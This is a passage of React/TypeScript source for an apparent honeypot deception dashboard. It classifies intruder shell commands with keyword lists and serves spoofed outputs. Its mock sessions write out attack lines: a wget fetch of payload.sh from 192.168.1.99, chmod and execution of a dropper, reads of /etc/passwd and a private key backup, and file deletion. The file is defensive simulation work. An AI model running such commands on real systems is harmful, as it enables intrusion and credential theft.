import React, { useState, useEffect, useRef } from 'react';
import { 
  Terminal as TerminalIcon, Shield, Activity, Cpu, Play, 
  AlertTriangle, Crosshair, Network, FileWarning, TerminalSquare,
  Layers, Lock, Eye, Server, Award, Database, RefreshCw, CheckCircle2,
  Info, HelpCircle, Flame, Target, Compass, Search, ArrowUpDown, Trash2, Sliders,
  Pause, RotateCcw, FastForward, CheckCircle, Radio, Bot
} from 'lucide-react';
import { LineChart, Line, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, AreaChart, Area } from 'recharts';
import { motion, AnimatePresence } from 'framer-motion';
import RLModelDiagnostics from './components/RLModelDiagnostics';
import GenerativeDecoyEngine from './components/GenerativeDecoyEngine';
import ThreatIntelFeed from './components/ThreatIntelFeed';
import AIDeceptionConsultant from './components/AIDeceptionConsultant';

// --- Types ---
interface DeceptionEvent {
  id: number;
  timestamp: string;
  cmd: string;
  tactic: string;
  target: string;
  spoofedInfo: string;
  attackerResponse: string;
}

interface SessionCommand {
  cmd: string;
  out: string;
  tactic: string;
  target: string;
  spoofedInfo: string;
  attackerResponse: string;
  timestamp: string;
}

interface SessionRecord {
  id: string;
  name: string;
  timestamp: string;
  commands: SessionCommand[];
  sqsData: { time: number; sqs: number }[];
  isPreRecorded?: boolean;
}

type CommandItem = { cmd: string; out: string };

// --- Backend Logic & Mock Data ---

function encodeCommand(command: string) {
  let hash = 0;
  for (let i = 0; i < command.length; i++) {
    hash = ((hash << 5) - hash) + command.charCodeAt(i);
    hash |= 0;
  }
  return Math.abs(hash) % 100;
}

function classifyCommand(command: string) {
  const cmd = command.toLowerCase().trim();
  const scanning = ["nmap", "nc ", "netcat", "masscan", "nikto"];
  const malware = ["wget", "curl", "./", "chmod", "scp", "tftp", "ftp", "python -c", "perl -e", "rm ", "sh "];
  const recon = ["ls", "pwd", "whoami", "cat", "uname", "ps", "ifconfig", "ip a", "netstat", "ss ", "id", "hostname", "find", "grep"];

  if (scanning.some(k => cmd.includes(k))) return 3;
  if (malware.some(k => cmd.includes(k))) return 2;
  if (recon.some(k => cmd.includes(k))) return 1;
  return 0; // normal
}

function mapActionName(action: number | null) {
  if (action === null) return "WAITING_FOR_INPUT";
  const m: Record<number, string> = {
    0: "NORMAL_EXECUTION",
    1: "LATENCY_INJECTION",
    2: "FAKE_ERROR",
    3: "FAKE_SUCCESS",
    4: "ENV_MODIFICATION",
  };
  return m[action] || "UNKNOWN";
}

function decideAction(state: { command_type: number }) {
  if (state.command_type === 3) return 1; // Scanner -> Inject Delay (Tarpit)
  if (state.command_type === 2) return 0; // Malware -> Execute in hypervisor sandbox
  if (state.command_type === 1) return 4; // Recon -> Environment alteration (Fake files)
  return 0;
}

// Detailed mapping of adversarial commands to their respective Decoy outcomes
function getDeceptionDetail(
  cmd: string, 
  downloadTamperMode: "CORRUPT_EOF" | "TRUNCATED_90" | "POISONED_HEADER" | "MOCK_SUCCESS",
  sensitiveFileSpoofMode: "RANDOM_SHARES_INCONSISTENCY" | "SIMULATED_LOG_INTRUSION" | "EXPIRED_SSH_BAIT" | "CORRUPTED_SQL_DUMP"
) {
  const c = cmd.toLowerCase().trim();
  
  // 1. Downloading files (wget / curl / scp / tftp)
  if (c.includes("wget") || c.includes("curl") || c.includes("scp") || c.includes("tftp")) {
    const url = cmd.split(" ").find(arg => arg.startsWith("http://") || arg.startsWith("https://")) || "http://192.168.1.99:8000/payload.sh";
    const filename = url.substring(url.lastIndexOf("/") + 1) || "payload.sh";

    if (downloadTamperMode === "CORRUPT_EOF") {
      return {
        tactic: "MUTATED_PAYLOAD_POISONING",
        target: "Malicious Dropper Download",
        spoofedInfo: `Injected a deliberate null-byte checksum mismatch at EOF of ${filename}. Real size simulated: 1024 bytes.`,
        attackerResponse: `The malware dropper fails to compile/run due to trailing block CRC error (integrity check failed), forcing the attacker to manually debug.`,
        overrideOut: `Connecting to 192.168.1.99:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1024 (1.0K) [application/x-sh]\nSaving to: '${filename}'\n\n     0K .                                                     100% 1.0M=0.001s\n\n2026-05-19T20:53:05 (1.0 MB/s) - '${filename}' saved [1024/1024]\n\n[WARNING] checksum integrity warning (CRC32 mismatch): Local calculated code blocks do not match raw channel signatures (File corrupted at EOF).`
      };
    } else if (downloadTamperMode === "TRUNCATED_90") {
      return {
        tactic: "DYNAMIC_FLOW_TRUNCATION",
        target: "Incomplete Dropper Fetch",
        spoofedInfo: `Artificially fractured TCP network socket at 90% of file stream. Dropped connection before EOF.`,
        attackerResponse: `Attacker download is halted abruptly. Terminal report indicates premature closure, leaving tool files content corrupted or half-empty.`,
        overrideOut: `Connecting to 192.168.1.99:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1024 (1.0K) [application/x-sh]\nSaving to: '${filename}'\n\n     0K .                                                      90% 1.0M=0.001s\n\ncurl: (18) transfer closed with 102 bytes remaining to read.\n[CONNECTION RESET BY PEER: INCOMPLETE BINARY OR SCRIPT RECONSTRUCTION]`
      };
    } else if (downloadTamperMode === "POISONED_HEADER") {
      return {
        tactic: "DECOY_INSTRUMENTATION_INJECT",
        target: "Instrumented Binary Serve",
        spoofedInfo: `Embedded hidden environment tracing headers and canary traps into the downloaded header script.`,
        attackerResponse: `Attacker triggers automated honeypot alarm code routines upon attempts to execute or read the poisoned file header.`,
        overrideOut: `Connecting to 192.168.1.99:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1024 (1.0K) [application/x-sh]\nSaving to: '${filename}'\n\n     0K .                                                     100% 1.0M=0.001s\n\n2026-05-19T20:53:05 (1.0 MB/s) - '${filename}' saved [1024/1024]\n[INFO] Injecting internal shadow monitoring telemetry hooks... Success.`
      };
    } else {
      // MOCK_SUCCESS
      return {
        tactic: "SANDBOX_ISOLATION_ECHO",
        target: "Regular Dropper Sandbox Download",
        spoofedInfo: `Faking TCP stream response 200 OK. Writing standard dropper payload bytes directly to transient memory filesystem.`,
        attackerResponse: `Download completes successfully. Attacker believes they saved a persistent binary to '/tmp/${filename}'.`,
        overrideOut: `--2026-05-10 17:32:00--  http://192.168.1.99:8000/payload.sh\nConnecting to 192.168.1.99:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1024 (1.0K) [application/x-sh]\nSaving to: 'payload.sh'\n\n     0K .                                                     100% 1.0M=0.001s\n\n2026-05-10 17:32:00 (1.0 MB/s) - 'payload.sh' saved [1024/1024]`
      };
    }
  }

  // 2. Sensitive files (cat /etc/passwd, cat /etc/shadow)
  if (c.includes("passwd") || c.includes("shadow")) {
    if (sensitiveFileSpoofMode === "RANDOM_SHARES_INCONSISTENCY") {
      return {
        tactic: "FS_INTEGRITY_SPOOF",
        target: "Identity Group Enumeration",
        spoofedInfo: `Presented custom /etc/passwd containing unprivileged user accounts assigned to superuser GID 0.`,
        attackerResponse: `Attacker notes UID/GID contradictions in the bait accounts, spending hours debugging privilege escalate vectors.`,
        overrideOut: `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ndb_vault_sync:x:1021:0:Database Vault Sync Agent:/var/lib/db:/bin/bash\noperator:x:37:37:Operator:/var:/sbin/nologin\nmisaligned_user:x:1550:0::/home/misaligned:/bin/sh`
      };
    } else if (sensitiveFileSpoofMode === "SIMULATED_LOG_INTRUSION") {
      return {
        tactic: "HONEYTOKEN_SPELLING_TRAP",
        target: "Automated User Extraction",
        spoofedInfo: `Served user file seeded with typos ('db_vault_snyc') to filter out raw brute-force script scraping activity.`,
        attackerResponse: `Scraper extracts misspelled user logins; trying to login using these names locks out attacker IPs and speeds up threat scoring.`,
        overrideOut: `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ndb_vault_snyc:x:1021:1021::/var/lib/db_sync:/bin/bash\nsecondary_audit_alert:x:1029:1029::/var/log/audit:/bin/false`
      };
    } else if (sensitiveFileSpoofMode === "EXPIRED_SSH_BAIT") {
      return {
        tactic: "EXPIRED_COGNITIVE_DECOY",
        target: "Obsolete Hash Extraction",
        spoofedInfo: `Injected bcrypt hashes for historically expired/disabled accounts (e.g., 'legacy_db_user').`,
        attackerResponse: `Intruder initiates heavy cracking against high-entropy synthetic keys, wasting heavy target CPU power for nothing.`,
        overrideOut: `root:x:0:0:root:/root:/bin/bash\nlegacy_db_admin:$6$rounds=50000$saltsalt$expiredhash1234fakefakefakefake:19200:0:99999:7:::\nbackup_steward:$6$invalid_or_expired_bcrypt_hash_pattern_deadbeef:19200:0:99999:7:::`
      };
    } else if (sensitiveFileSpoofMode === "CORRUPTED_SQL_DUMP") {
      return {
        tactic: "MALFORMED_FS_RESPONSE",
        target: "Damaged Database Index",
        spoofedInfo: `Served an /etc/passwd representation backed by broken characters and database binary chunk artifacts.`,
        attackerResponse: `Reader streams crash when parsing the system credentials, isolating automated reconnaissance programs instantly.`,
        overrideOut: `root:x:0:0:root:/root:/bin/bash\ndaemon:\x00\xff\x7f\x12\\CORRUPTED_SYS_BLOCK\\1:daemon:/usr/sbin:/usr/sbin/nologin\nERROR: read access violation on block sector 0x3f54`
      };
    }
  }

  // 3. Sensitive file lookups - SSH key private keys (id_rsa, rsa.bak)
  if (c.includes("id_rsa")) {
    if (sensitiveFileSpoofMode === "EXPIRED_SSH_BAIT") {
      return {
        tactic: "SSH_KEY_BAIT_CORRUPTION",
        target: "Credentials Exfiltration",
        spoofedInfo: `Injected expired decoy SSH key containing deliberate checksum base64 padding errors.`,
        attackerResponse: `Attacker exfiltrates key, but attempts to establish connection fail on client side ('Invalid Key Format/Padding' fault).`,
        overrideOut: `-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtcn\nNhAAAAAwEAAQAAAADAALZ7G9N8mSpbN/G/k6Zp5n8O0e9b9J8K9XvL5q9Mno97r+9+u898\ny2Y9N60M++7o8vOa6r8u/L/v7/r+8M98y2Y9N60M++7o8vOa6r8u/L/v7/r+8M98y2Y9\n----- CORRUPTED END OF SSH KEY: UNALIGNED BASE64 PADDING -----\n[ERROR: INVALID PRIVATE KEY CHECK VALUE]`
      };
    } else if (sensitiveFileSpoofMode === "SIMULATED_LOG_INTRUSION") {
      return {
        tactic: "HONEY_METADATA_TUNNEL",
        target: "Traced Private Key Pull",
        spoofedInfo: `Served an SSH private key containing active tracing metadata tunnels embedded inside comments and payload blocks.`,
        attackerResponse: `Connecting with the key sends immediate canary handshake alerts carrying the attacker's client information to console logs.`,
        overrideOut: `-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtcn\nNhAAAAAwEAAQAAAADAALZ7G9N8mSpbN/G/k6Zp5n8O0e9b9J8K9XvL5q9Mno97r+9+u898\n# ID_TRACER: STUNNEL_PORT_22_METADATA_TRACKING_ACTIVE_MD\n-----END OPENSSH PRIVATE KEY-----`
      };
    } else if (sensitiveFileSpoofMode === "CORRUPTED_SQL_DUMP") {
      return {
        tactic: "MALFORMED_SSH_REPLY",
        target: "Damaged Key Vector",
        spoofedInfo: `Served an SSH key block which has parts overwritten by randomized raw hexadecimal backup byte sectors.`,
        attackerResponse: `Extruded key parsing fails in attacker tools with 'corrupted key structure' error messages, preventing rapid credentials reuse.`,
        overrideOut: `-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtcn\n[ !!! SEGMENT DEVIATION: SECTOR_FAULT READ EXCEEDED AT 0x7FFA !!! ]\n00000010: e58f 2a40 f322 1c00 77cc ab12 00ff 223c\n-----END OPENSSH PRIVATE KEY-----`
      };
    } else {
      return {
        tactic: "SSH_KEY_JAIL",
        target: "Private Key Extraction",
        spoofedInfo: `Serving an inactive simulated SSH key mapped inside our containment hypervisor zone.`,
        attackerResponse: `Attacker exfiltrates standard decoy key to try downstream ssh logins, allowing deep telemetry tracking.`,
        overrideOut: `-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtcn\nNhAAAAAwEAAQAAAADAALZ7G9N8mSpbN/G... [REDACTED KEY DATA] ...\n-----END OPENSSH PRIVATE KEY-----`
      };
    }
  }

  // 4. Sensitive Database Backups (backup.sql, prod_backup.sql, etc.)
  if (c.includes("backup.sql") || c.includes("backup")) {
    if (sensitiveFileSpoofMode === "CORRUPTED_SQL_DUMP") {
      return {
        tactic: "MALFORMED_DUMP_RESPONSE",
        target: "Damaged Database Dump",
        spoofedInfo: `Served SQL file corrupted by arbitrary PostgreSQL archiver EOF injection.`,
        attackerResponse: `PostgreSQL tools and exfiltrated SQL parsers crash on syntax alignment errors (unexpected end lines).`,
        overrideOut: `-- PostgreSQL database dump\n-- Dumped from database version 13.3\nCREATE TABLE core_vault (api_key VARCHAR(100), config TEXT);\nINSERT INTO core_vault VALUES ('prod_live_key_99ab', 'data_index_hash_f3);\n-- ERROR: pg_dump: [archiver] unexpected end of file mid-row insertion`
      };
    } else if (sensitiveFileSpoofMode === "SIMULATED_LOG_INTRUSION") {
      return {
        tactic: "DATABASE_BAIT_FEED",
        target: "Seeded SQL Keys Harvest",
        spoofedInfo: `Served a mock database dump featuring deliberate api key spelling drift ('apikey_snyc') and canary API tokens.`,
        attackerResponse: `Intruder tools parse bait tokens and trigger tracking systems when attempting validation calls against real cloud endpoints.`,
        overrideOut: `-- PostgreSQL database dump\nCREATE TABLE auth_keys (key_id INT, token_key TEXT);\nINSERT INTO auth_keys VALUES (32, 'prod_aws_key_snyc_88ab'); -- bait\nINSERT INTO auth_keys VALUES (33, 'prod_stripe_bypass_fake_e012');`
      };
    } else if (sensitiveFileSpoofMode === "EXPIRED_SSH_BAIT") {
      return {
        tactic: "EXPIRED_RESTORE_FEED",
        target: "Obsolete Row Inconsistencies",
        spoofedInfo: `Served SQL file containing rows marked with expired schema dates and deactivated token metadata.`,
        attackerResponse: `Attacker attempts automated logins with expired and closed API keys, exposing their active routing IPs.`,
        overrideOut: `-- PostgreSQL database dump\nCREATE TABLE keys_table (id INT, key TEXT, status TEXT);\nINSERT INTO keys_table VALUES (1, 'live_client_token_f9c2a', 'EXPIRED_2024');\nINSERT INTO keys_table VALUES (2, 'token_sandbox_key_ab394c', 'DEACTIVATED');`
      };
    } else {
      return {
        tactic: "SPOOFED_ENVIRONMENT_TREE",
        target: "Virtual Directory Dump",
        spoofedInfo: `Generates simulated standard production database SQL tables matching server parameters.`,
        attackerResponse: `Attacker saves raw SQL with random usernames and bcrypt keys into their capture logs.`,
        overrideOut: `-- PostgreSQL database dump\nCREATE TABLE system_users (id INT, user TEXT, pwd TEXT);\nINSERT INTO system_users VALUES (1, 'admin', 'md5f0e8f...');`
      };
    }
  }

  // 5. Normal Fallbacks
  if (c.includes("nmap") || c.includes("masscan")) {
    return {
      tactic: "DYNAMIC_TARPIT_LATENCY",
      target: "Automated Network Sweep",
      spoofedInfo: "Routing socket requests through dynamic delay queues. Emulating closed states on ports 1-1000 except SSH 22.",
      attackerResponse: "Scan is heavily rate-limited. Attacker scripts report socket timeouts and anomalous high network latency."
    };
  }
  if (c.includes("nc ") || c.includes("netcat")) {
    return {
      tactic: "MOCK_BANNER_SPOOFING",
      target: "Banner Grabbing Activity",
      spoofedInfo: "Serving outdated SSH-2.0-OpenSSH_7.4p1 Ubuntu-11 bait string. Logging packet timestamps & TTL signatures.",
      attackerResponse: "Attacker notes old SSH server version and initiates known vulnerabilities exploit sweep on safe dummy socket."
    };
  }
  if (c.includes("chmod") || c.includes("./") || c.includes("sh ") || c.includes("python")) {
    return {
      tactic: "SYNTHETIC_C2_LOOPBACK",
      target: "Trojan Dropper Execution",
      spoofedInfo: "Emulating active loopback listeners. Intercepting outgoing socket calls. Replying with randomized telemetry responses.",
      attackerResponse: "Dropper script starts, triggers artificial 'Connection to C2 server established' signal. Malware is safely quarantined."
    };
  }
  if (c.includes("whoami") || c.includes("id")) {
    return {
      tactic: "VIRTUAL_USER_SPOOF",
      target: "Identity Enumeration",
      spoofedInfo: "Faking superuser status 'root' (UID 0), while containment policy restricts session to jail boundary.",
      attackerResponse: "Attacker assumes full machine compromise and attempts complex privilege operations safely."
    };
  }
  if (c.includes("ls") || c.includes("pwd") || c.includes("find")) {
    return {
      tactic: "SPOOFED_ENVIRONMENT_TREE",
      target: "Directory & Credential Scan",
      spoofedInfo: "Generating false directory overlay. Showing mock DB backups ('prod_db_v3_backup.sql') mapped purely in virtual disk.",
      attackerResponse: "Attacker targets bait files for exfiltration, which triggers instantaneous deep alarm tracking."
    };
  }
  if (c.includes("rm ")) {
     return {
       tactic: "STATEFUL_DELETION_ECHO",
       target: "Anti-Forensics Cleansing",
       spoofedInfo: "Simulating disk removal event with fake success return. Preserving original file block metadata for forensic analysis.",
       attackerResponse: "Attacker reports traces wiped, unaware that their uploaded tools and commands are indexed in high-resolution logs."
     };
  }

  // Fallbacks by type
  const type = classifyCommand(cmd);
  if (type === 1) {
    return {
      tactic: "ENVIRONMENT_VIRTUALIZATION",
      target: "General System Reconnaissance",
      spoofedInfo: "Injecting false hardware structures, mock network interfaces, and unprivileged system configuration templates.",
      attackerResponse: "Recon software completes successfully with safe, high-entropy simulated parameters."
    };
  }
  if (type === 2) {
    return {
      tactic: "VIRTUAL_SANDBOX_TRAP",
      target: "Arbitrary Binary Execution",
      spoofedInfo: "Redirecting code execution hooks to temporary sandbox process container. Logging and dissecting binary logic.",
      attackerResponse: "System handles execution. Payload execution loops harmlessly inside constrained volatile container."
    };
  }
  if (type === 3) {
    return {
      tactic: "DYNAMIC_TARPIT_LATENCY",
      target: "Probing & Scanning",
      spoofedInfo: "Stalling response packets to enforce severe throughput caps on the scanning client.",
      attackerResponse: "Scanners lag behind, preventing rapid identification of server entry points."
    };
  }

  return {
    tactic: "MOCK_KERNEL_BYPASS",
    target: "Unclassified Operational Command",
    spoofedInfo: "Logging command vector and passing input to mock-filesystem jail without warning.",
    attackerResponse: "Awaiting next keyboard entry from the target terminal."
  };
}

const PROFILES: Record<string, CommandItem[]> = {
  scanner: [
    { cmd: "nmap -sS -p- 10.0.0.5", out: "Starting Nmap 7.80 ( https://nmap.org )\nNmap scan report for 10.0.0.5\nHost is up (0.0012s latency).\nNot shown: 65534 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh" },
    { cmd: "masscan -p1-65535 10.0.0.5 --rate=1000", out: "Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2026-05-10 17:30 GMT\nInitiating SYN Stealth Scan" },
    { cmd: "nc -vz 10.0.0.5 22", out: "Ncat: Version 7.80 ( https://nmap.org/ncat )\nNcat: Connected to 10.0.0.5:22.\nNcat: 0 bytes sent, 0 bytes received in 0.01 seconds." }
  ],
  malware: [
    { cmd: "wget http://192.168.1.99:8000/payload.sh", out: "--2026-05-10 17:32:00--  http://192.168.1.99:8000/payload.sh\nConnecting to 192.168.1.99:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1024 (1.0K) [application/x-sh]\nSaving to: 'payload.sh'\n\n     0K .                                                     100% 1.0M=0.001s\n\n2026-05-10 17:32:00 (1.0 MB/s) - 'payload.sh' saved [1024/1024]" },
    { cmd: "chmod +x payload.sh", out: "" },
    { cmd: "./payload.sh", out: "Extracting dropper...\nInstalling cron persistence...\nConnecting to C2...\n[+] Success" },
    { cmd: "rm payload.sh", out: "" }
  ],
  recon: [
    { cmd: "whoami", out: "root" },
    { cmd: "pwd", out: "/root" },
    { cmd: "cat /etc/passwd", out: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin" },
    { cmd: "ls -la", out: "total 12\ndrwx------  2 root root 4096 May 10 17:30 .\ndrwxr-xr-x 18 root root 4096 May 10 17:00 ..\n-rw-------  1 root root  204 May 10 17:28 .bash_history" }
  ]
};

const INITIAL_DECEPTION_EVENTS: DeceptionEvent[] = [
  {
    id: 1,
    timestamp: "14:26:02",
    cmd: "ssh root@10.0.0.5 -p 22",
    tactic: "VIRTUAL_SERVICE_JAIL",
    target: "Brute-Force Penetration",
    spoofedInfo: "Accepted root credentials using decoy login. Triggered hypervisor sandboxing sequence.",
    attackerResponse: "Authentication successful. Terminal session initialized inside container instance `cont_940`."
  },
  {
    id: 2,
    timestamp: "14:28:11",
    cmd: "uname -a",
    tactic: "SYS_SIGNATURE_SPOOF",
    target: "Host Operating System Audit",
    spoofedInfo: "Fed back standard static output template: Linux ubuntu 5.4.0-74-generic #83-Ubuntu x86_64.",
    attackerResponse: "Attacker registers kernel signature, planning local root exploit vectors targeting obsolete release."
  }
];

const PRE_RECORDED_SESSIONS: SessionRecord[] = [
  {
    id: "SESS-APT41",
    name: "APT-41 Identity Harvesting",
    timestamp: "2026-05-19 14:26:02",
    commands: [
      {
        cmd: "ssh root@10.0.0.5 -p 22",
        out: "SSH Connection Established. Host keys authorized.",
        tactic: "VIRTUAL_SERVICE_JAIL",
        target: "Brute-Force Penetration",
        spoofedInfo: "Accepted root credentials using decoy login. Triggered hypervisor sandboxing sequence.",
        attackerResponse: "Authentication successful. Terminal session initialized inside container instance `cont_940`.",
        timestamp: "14:26:02"
      },
      {
        cmd: "uname -a",
        out: "Linux ubuntu 5.4.0-74-generic #83-Ubuntu SMP Tue May 11 17:30:14 UTC 2026 x86_64 x86_64 GNU/Linux",
        tactic: "SYS_SIGNATURE_SPOOF",
        target: "Host Operating System Audit",
        spoofedInfo: "Fed back standard static output template: Linux ubuntu 5.4.0-74-generic.",
        attackerResponse: "Attacker registers kernel signature, planning local root exploit vectors targeting obsolete release.",
        timestamp: "14:28:11"
      },
      {
        cmd: "whoami",
        out: "root",
        tactic: "VIRTUAL_USER_SPOOF",
        target: "Identity Enumeration",
        spoofedInfo: "Faked superuser status 'root' (UID 0), while containment policy restricts session to jail boundary.",
        attackerResponse: "Attacker assumes full machine compromise and attempts complex privilege operations safely.",
        timestamp: "14:29:05"
      },
      {
        cmd: "cat /etc/passwd",
        out: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ndb_vault_sync:x:1021:0:Database Vault Sync Agent:/var/lib/db:/bin/bash\noperator:x:37:37:Operator:/var:/sbin/nologin\nmisaligned_user:x:1550:0::/home/misaligned:/bin/sh",
        tactic: "FS_INTEGRITY_SPOOF",
        target: "Identity Group Enumeration",
        spoofedInfo: "Served identity list custom modified with misaligned groups to stimulate privilege elevation actions.",
        attackerResponse: "Attacker notes misaligned user GID 0 accounts and spends time searching for matching access vectors.",
        timestamp: "14:31:40"
      }
    ],
    sqsData: [
      { time: 0, sqs: 10 },
      { time: 1, sqs: 25 },
      { time: 2, sqs: 40 },
      { time: 3, sqs: 65 },
      { time: 4, sqs: 85 }
    ],
    isPreRecorded: true
  },
  {
    id: "SESS-VIPER",
    name: "Viper Ransomware Dropper",
    timestamp: "2026-05-19 15:11:43",
    commands: [
      {
        cmd: "wget http://192.168.1.99:8000/payload.sh",
        out: "Connecting to 192.168.1.99:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1024 (1.0K) [application/x-sh]\nSaving to: 'payload.sh'\n\n     0K .                                                     100% 1.0M=0.001s\n\n2026-05-19T15:11:45 (1.0 MB/s) - 'payload.sh' saved [1024/1024]\n\n[WARNING] checksum integrity warning (CRC32 mismatch): Local calculated code blocks do not match raw channel signatures (File corrupted at EOF).",
        tactic: "MUTATED_PAYLOAD_POISONING",
        target: "Malicious Dropper Download",
        spoofedInfo: "Injected a deliberate null-byte checksum mismatch at EOF of payload.sh, raising integrity warnings.",
        attackerResponse: "The malware dropper fails to compile/run due to trailing block CRC error (integrity check failed), forcing the attacker to manually debug.",
        timestamp: "15:11:45"
      },
      {
        cmd: "chmod +x payload.sh",
        out: "",
        tactic: "STATEFUL_DELETION_ECHO",
        target: "Permission Change Logging",
        spoofedInfo: "Captured executable bit configuration in memory audit queue, keeping jail isolated.",
        attackerResponse: "Attacker assumes the system accepted execution privileges normally.",
        timestamp: "15:12:01"
      },
      {
        cmd: "./payload.sh",
        out: "[ERROR: INVALID SCRIPT CHECK VALUE AT LINE 42]\nTerminated execution block.",
        tactic: "VIRTUAL_SANDBOX_TRAP",
        target: "Arbitrary Binary Execution",
        spoofedInfo: "Simulated execution error on poisoned dropper script, preventing malware persistence.",
        attackerResponse: "Attacker receives script format errors, starting localized debugging inside hypervisor containment cage.",
        timestamp: "15:12:15"
      }
    ],
    sqsData: [
      { time: 0, sqs: 15 },
      { time: 1, sqs: 60 },
      { time: 2, sqs: 75 },
      { time: 3, sqs: 90 }
    ],
    isPreRecorded: true
  },
  {
    id: "SESS-BROKER",
    name: "ShadowBroker Credential Harvest",
    timestamp: "2026-05-19 16:40:55",
    commands: [
      {
        cmd: "pwd",
        out: "/root",
        tactic: "SPOOFED_ENVIRONMENT_TREE",
        target: "Directory & Credential Scan",
        spoofedInfo: "Served simulated active homedir.",
        attackerResponse: "Awaiting next keyboard entry from the target terminal.",
        timestamp: "16:40:55"
      },
      {
        cmd: "ls -la",
        out: "total 16\ndrwx------  3 root root 4096 May 19 16:41 .\ndrwxr-xr-x 18 root root 4096 May 19 16:00 ..\n-rw-------  1 root root  204 May 19 16:40 .bash_history\n-rw-r--r--  1 root root 1024 May 19 16:41 id_rsa.bak\n-rw-r--r--  1 root root 8192 May 19 16:41 prod_backup.sql",
        tactic: "SPOOFED_ENVIRONMENT_TREE",
        target: "Directory & Credential Scan",
        spoofedInfo: "Showed virtual SSH key backups and SQL database dumps.",
        attackerResponse: "Attacker spots backup storage file vectors and focuses reconnaissance on exfiltration scripts.",
        timestamp: "16:41:03"
      },
      {
        cmd: "cat id_rsa.bak",
        out: "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtcn\nNhAAAAAwEAAQAAAADAALZ7G9N8mSpbN/G/k6Zp5n8O0e9b9J8K9XvL5q9Mno97r+9+u898\n# ID_TRACER: STUNNEL_PORT_22_METADATA_TRACKING_ACTIVE_MD\n-----END OPENSSH PRIVATE KEY-----",
        tactic: "HONEY_METADATA_TUNNEL",
        target: "Traced Private Key Pull",
        spoofedInfo: "Served an SSH private key containing active tracking headers and Canary callbacks.",
        attackerResponse: "Attacker exfiltrates telemetry-embedded SSH key, raising intrusion alert alarms across honeypot grid.",
        timestamp: "16:41:22"
      }
    ],
    sqsData: [
      { time: 0, sqs: 10 },
      { time: 1, sqs: 30 },
      { time: 2, sqs: 55 },
      { time: 3, sqs: 92 }
    ],
    isPreRecorded: true
  }
];

export default function App() {
  const [profileQueue, setProfileQueue] = useState<CommandItem[]>([]);
  const [typingText, setTypingText] = useState("");
  const [terminalLog, setTerminalLog] = useState<{type: 'cmd'|'out', text: string}[]>([]);
  
  const [rlState, setRlState] = useState({
     num_commands: 2,
     time_alive: 129,
     unique_commands: 2,
     last_command: 34,
     repetitive: 0,
     command_type: 1
  });
  
  const [commandHistory, setCommandHistory] = useState<string[]>([]);
  const [currentAction, setCurrentAction] = useState<number | null>(null);
  const [sqsHistory, setSqsHistory] = useState<{time: number, sqs: number}[]>([{time: 0, sqs: 10}]);
  const [activeProfile, setActiveProfile] = useState<string | null>(null);

  // Honeypot Specific states
  const [deceptionEvents, setDeceptionEvents] = useState<DeceptionEvent[]>(INITIAL_DECEPTION_EVENTS);
  const [activeDeceptionTab, setActiveDeceptionTab] = useState<'illusion' | 'feed' | 'pipeline' | 'replay' | 'diagnostics' | 'generative' | 'threatIntel' | 'advisor'>('illusion');
  const [systemPersona, setSystemPersona] = useState<string>("Financial Database Server");
  
  // Backend RL Connection states
  const [backendStatus, setBackendStatus] = useState<'idle' | 'evaluating' | 'online' | 'offline'>('online');
  const [lastApiTrace, setLastApiTrace] = useState<any | null>(null);
  
  // Session Replay/Recording state variables
  const [pastSessions, setPastSessions] = useState<SessionRecord[]>(PRE_RECORDED_SESSIONS);
  const [liveSessionCommands, setLiveSessionCommands] = useState<SessionCommand[]>([]);
  const [isReplaying, setIsReplaying] = useState<boolean>(false);
  const [replaySession, setReplaySession] = useState<SessionRecord | null>(null);
  const [replayCommandIndex, setReplayCommandIndex] = useState<number>(0);
  const [replaySpeed, setReplaySpeed] = useState<number>(1);
  const [replayIsPaused, setReplayIsPaused] = useState<boolean>(false);
  const [replayTypingText, setReplayTypingText] = useState<string>("");

  const [bytesSpoofed, setBytesSpoofed] = useState<number>(3124);
  const [sandboxContainment, setSandboxContainment] = useState<number>(100); // 100% isolated
  const [activeTrappingStep, setActiveTrappingStep] = useState<number>(0); // Interactive visual pipeline step (0 to 3)

  // Trapping customizer states
  const [downloadTamperMode, setDownloadTamperMode] = useState<"CORRUPT_EOF" | "TRUNCATED_90" | "POISONED_HEADER" | "MOCK_SUCCESS">("CORRUPT_EOF");
  const [sensitiveFileSpoofMode, setSensitiveFileSpoofMode] = useState<"RANDOM_SHARES_INCONSISTENCY" | "SIMULATED_LOG_INTRUSION" | "EXPIRED_SSH_BAIT" | "CORRUPTED_SQL_DUMP">("RANDOM_SHARES_INCONSISTENCY");

  // Sorting and Filtering States for the Audit Ledger Table
  const [logSearch, setLogSearch] = useState("");
  const [selectedTactic, setSelectedTactic] = useState("ALL");
